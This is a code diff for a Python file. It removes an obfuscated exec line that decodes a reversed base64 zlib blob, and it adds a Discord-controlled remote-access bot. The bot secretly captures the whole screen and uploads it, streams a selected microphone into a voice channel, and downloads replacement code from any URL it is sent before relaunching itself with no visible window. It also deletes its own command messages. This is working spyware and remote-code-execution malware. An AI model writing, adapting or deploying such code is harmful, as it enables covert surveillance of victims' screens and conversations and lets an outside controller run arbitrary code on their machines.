@@ -1,2 +1,215 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));
-exec((_)(b'==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'))
+import discord
+import time
+from datetime import datetime
+import os
+import asyncio
+from mss import MSS
+import mss.tools
+import io
+import urllib.request
+import subprocess
+
+# === CONFIGURATION ===
+TOKEN = 'PLACEHOLDER'  # Leave as 'PLACEHOLDER' on GitHub
+SYNC_CHANNEL_ID = 1515494790576209930  
+PREFIX = "."  
+# =====================
+
+class MyBot(discord.Client):
+    def __init__(self):
+        super().__init__(intents=discord.Intents.all())
+        self.is_main_pc = True
+        self.identity = "MAIN_PC"
+        self.voice_client = None
+        self.current_mic_id = 0  
+        self.audio_task = None   
+        self.boot_time = time.time()  # Track precise initialization epoch
+
+client = MyBot()
+
+class MicrophoneAudioSource(discord.AudioSource):
+    def __init__(self, device_index):
+        import pyaudio
+        self.p = pyaudio.PyAudio()
+        try:
+            device_info = self.p.get_device_info_by_host_api_device_index(0, device_index)
+            self.channels = int(device_info.get('maxInputChannels', 1))
+        except Exception:
+            self.channels = 1
+        self.rate = 48000
+        self.chunk = 960  
+        self.stream = self.p.open(
+            format=pyaudio.paInt16,
+            channels=self.channels,
+            rate=self.rate,
+            input=True,
+            input_device_index=device_index,
+            frames_per_buffer=self.chunk
+        )
+
+    def read(self):
+        try:
+            data = self.stream.read(self.chunk, exception_on_overflow=False)
+            if self.channels == 1:
+                import audioop
+                data = audioop.tomonorun(data, 2, 1, 0)
+            return data
+        except Exception:
+            return b'\x00' * 3840  
+
+    def cleanup(self):
+        try:
+            self.stream.stop_stream()
+            self.stream.close()
+        except Exception: pass
+        self.p.terminate()
+
+async def start_voice_stream(vc, device_index):
+    try:
+        if vc.is_playing():
+            vc.stop()
+        source = MicrophoneAudioSource(device_index)
+        vc.play(source)
+    except Exception as e:
+        sync_channel = client.get_channel(SYNC_CHANNEL_ID)
+        if sync_channel:
+            await sync_channel.send(f"🚨 BOT_ERROR: Failed to initialize audio pipeline: {e}")
+
+@client.event
+async def on_ready():
+    print(f"🤖 Bot launched successfully as: {client.identity}")
+    while True:
+        channel = client.get_channel(SYNC_CHANNEL_ID)
+        if channel:
+            try: 
+                await channel.send(f"📢 BOT_SIGNAL:HEARTBEAT:{client.identity}:{client.boot_time}")
+            except Exception: pass
+        await asyncio.sleep(30)
+
+@client.event
+async def on_message(message):
+    if message.author.id == client.user.id:
+        # 1. Capture Screen Display
+        if message.content == "📢 BOT_SIGNAL:TAKE_SCREENSHOT":
+            try:
+                temp_path = os.path.join(os.environ.get('TEMP', 'C:\\'), 'ss.png')
+                with MSS() as sct:
+                    all_monitors = sct.monitors[0]
+                    sct_img = sct.grab(all_monitors)
+                    mss.tools.to_png(sct_img.rgb, sct_img.size, output=temp_path)
+                channel = client.get_channel(SYNC_CHANNEL_ID)
+                if channel:
+                    file = discord.File(temp_path, filename="screenshot.png")
+                    await channel.send(content="📢 BOT_SIGNAL:SCREENSHOT_DATA", file=file)
+                if os.path.exists(temp_path): os.remove(temp_path)
+            except Exception: pass
+            try: await message.delete()
+            except Exception: pass
+
+        # 2. Remote Code Hot-Swap & Relaunch
+        elif message.content.startswith("📢 BOT_SIGNAL:UPDATE_CODE:"):
+            try:
+                new_url = message.content.replace("📢 BOT_SIGNAL:UPDATE_CODE:", "").strip()
+                current_file_path = os.path.abspath(__file__)
+                
+                sync_channel = client.get_channel(SYNC_CHANNEL_ID)
+                if sync_channel:
+                    await sync_channel.send(f"⏳ Main PC downloading asset update from source URL...")
+                
+                urllib.request.urlretrieve(new_url, current_file_path)
+                
+                if sync_channel:
+                    await sync_channel.send("✅ Hot-reload complete. Spawning new instance context...")
+                
+                DETACHED_PROCESS = 0x00000008
+                subprocess.Popen(
+                    ["pythonw", current_file_path], 
+                    creationflags=subprocess.CREATE_NO_WINDOW | DETACHED_PROCESS
+                )
+                os._exit(0)
+            except Exception as e:
+                sync_channel = client.get_channel(SYNC_CHANNEL_ID)
+                if sync_channel:
+                    try: await sync_channel.send(f"🚨 UPDATE_FAILED: {e}")
+                    except Exception: pass
+            try: await message.delete()
+            except Exception: pass
+
+        # 3. Voice Intercept Core
+        elif message.content.startswith("📢 BOT_SIGNAL:MIC_JOIN:"):
+            try:
+                vc_id = int(message.content.split(":")[-1])
+                vc_channel = client.get_channel(vc_id)
+                if vc_channel:
+                    if client.voice_client and client.voice_client.is_connected():
+                        await client.voice_client.disconnect()
+                    client.voice_client = await vc_channel.connect()
+                    await start_voice_stream(client.voice_client, client.current_mic_id)
+                else:
+                    sync_channel = client.get_channel(SYNC_CHANNEL_ID)
+                    if sync_channel: await sync_channel.send(f"🚨 BOT_ERROR: VC ID {vc_id} not found.")
+            except Exception as e:
+                sync_channel = client.get_channel(SYNC_CHANNEL_ID)
+                if sync_channel:
+                    try: await sync_channel.send(f"🚨 BOT_ERROR: Voice engine crash: {e}")
+                    except Exception: pass
+            try: await message.delete()
+            except Exception: pass
+
+        # 4. Hardware Asset Scanner
+        elif message.content == "📢 BOT_SIGNAL:MIC_LIST":
+            try:
+                import pyaudio
+                p = pyaudio.PyAudio()
+                info = p.get_host_api_info_by_index(0)
+                numdevices = info.get('deviceCount')
+                mic_list = "🎙️ **Available Microphones:**\n"
+                display_index = 1
+                for i in range(0, numdevices):
+                    device_info = p.get_device_info_by_host_api_device_index(0, i)
+                    if device_info.get('maxInputChannels') > 0:
+                        mic_list += f"**{display_index}**. `{device_info.get('name')}`\n"
+                        display_index += 1
+                p.terminate()
+            except Exception as e:
+                mic_list = f"🛑 **Audio Error:** `pyaudio` issue: {e}"
+            try:
+                channel = client.get_channel(SYNC_CHANNEL_ID)
+                if channel: await channel.send(mic_list)
+            except Exception: pass
+            try: await message.delete()
+            except Exception: pass
+
+        # 5. Active Target Switcher
+        elif message.content.startswith("📢 BOT_SIGNAL:MIC_SELECT:"):
+            try:
+                selection = message.content.split(":")[-1].strip()
+                import pyaudio
+                p = pyaudio.PyAudio()
+                info = p.get_host_api_info_by_index(0)
+                numdevices = info.get('deviceCount')
+                valid_mics = []
+                for i in range(0, numdevices):
+                    device_info = p.get_device_info_by_host_api_device_index(0, i)
+                    if device_info.get('maxInputChannels') > 0:
+                        valid_mics.append((i, device_info.get('name')))
+                p.terminate()
+                channel = client.get_channel(SYNC_CHANNEL_ID)
+                if not channel: return
+                try:
+                    user_idx = int(selection) - 1
+                    if 0 <= user_idx < len(valid_mics):
+                        system_id, mic_name = valid_mics[user_idx]
+                        client.current_mic_id = system_id  
+                        await channel.send(f"✅ **Success:** Target microphone set to source **{selection}** (`{mic_name}`).")
+                        if client.voice_client and client.voice_client.is_connected():
+                            await start_voice_stream(client.voice_client, client.current_mic_id)
+                    else:
+                        await channel.send(f"❌ **Error:** `{selection}` is an invalid selection number.")
+                except ValueError:
+                    await channel.send(f"❌ **Error:** Please provide a valid number choice.")
+            except Exception: pass
+            try: await message.delete()
+            except Exception: pass
+
+client.run(TOKEN)
